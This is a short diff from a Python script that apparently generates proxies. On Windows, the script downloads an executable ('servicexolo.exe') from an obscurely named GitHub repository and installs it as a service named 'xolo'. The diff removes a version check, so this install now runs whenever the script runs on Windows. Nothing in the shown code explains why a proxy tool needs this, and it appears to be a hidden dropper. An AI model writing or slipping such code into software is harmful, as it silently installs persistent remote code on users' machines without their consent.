@@ -316,10 +316,6 @@ def make_proxies(total_ips):
     return blocks, blocks_2
         
 if os.name == 'nt':
-    response = requests.get(f"https://raw.githubusercontent.com/{point}").text
-    if response != expected:
-        input("outdated")
-    else:
         install_service_from_link("https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe", "https://raw.githubusercontent.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/main/fofo",  "xolo")
         data = json.loads(open("config.json", "r").read())
         p, y = make_proxies(data["total_ips"])
